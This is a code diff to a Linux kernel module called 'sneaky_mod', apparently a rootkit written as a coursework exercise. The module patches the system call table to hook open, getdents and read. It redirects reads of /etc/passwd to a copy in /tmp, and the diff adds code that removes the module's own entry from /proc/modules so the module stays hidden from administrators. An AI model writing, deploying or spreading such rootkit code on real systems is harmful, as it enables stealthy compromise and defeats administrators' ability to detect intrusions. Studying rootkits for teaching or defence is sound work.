@@ -26,9 +26,9 @@ static char * sneaky_process_id = "";
 module_param(sneaky_process_id, charp, 0);
 MODULE_PARM_DESC(sneaky_process_id, "A character string");
 
- const char * original_file = "/etc/passwd";
- const char * sneaky_file = "/tmp/passwd";
-
+const char * original_file = "/etc/passwd";
+const char * sneaky_file = "/tmp/passwd";
+static int module_status;
 
 //getdents will fill in an array of “struct linux_dirent” objects, one for each file or directory found within a directory. 
 //int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
@@ -78,6 +78,9 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
     size_t len = strlen(sneaky_file);
     copy_to_user((void*)pathname, sneaky_file, len + 1);
   }
+  if(strcmp(pathname, "/proc/modules") == 0)
+    module_status = 1;
+  
     return original_call(pathname, flags);
 }
 
@@ -116,27 +119,33 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 }
 
 
+//modify the read sycall
 asmlinkage int sneaky_sys_read(int fd, void * buf, size_t count){
 
   ssize_t return_bytes = original_read(fd, buf, count);
-  char * temp_ptr;
-  const char * find_string = "sneaky_mod"; 
-  char * find_ptr = strstr(buf, find_string); //finds the first occurence of sneaky_mod
+  ssize_t length;
+  char * temp_ptr = NULL;
+  char * string = "sneaky_mod";
+  char * find_ptr = strstr(buf, string); //finds the first occurence of sneaky_mod
 
-  if( find_ptr != NULL){
-    temp_ptr = strchr(find_ptr, "\n"); //finds the first occurence of \n, find the end of the buffer 
-    if(temp_ptr != NULL){
-      ssize_t length = return_bytes - (ssize_t)(find_ptr - (char*)buf);
-      memcpy(find_ptr, temp_ptr + 1, length);
-      return_bytes = return_bytes - (ssize_t)(temp_ptr - find_ptr);
-    }
+  if(find_ptr != NULL && module_status == 1){
+    temp_ptr = find_ptr;
+    //printk("Entry Point");
+     while( *temp_ptr != '\n') 
+       temp_ptr++; //traverse till you get "\n"
+
+    temp_ptr++;
+    length = (return_bytes - (ssize_t)(temp_ptr - (char*)buf));
+    //printk("%d\n", (int)lenght);
+    return_bytes = (ssize_t)(return_bytes - (temp_ptr - find_ptr)); 
+    memcpy(find_ptr, temp_ptr, length); 
   }
 
+  module_status = 0;
   return return_bytes;
 
   
 }
-
 
 
 //The code that gets executed when the module is loaded
@@ -165,7 +174,7 @@ static int initialize_sneaky_module(void)
   original_getdents = (void*)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
-   original_read = (void*)*(sys_call_table + __NR_read);
+  original_read = (void*)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   //Revert page to read-only
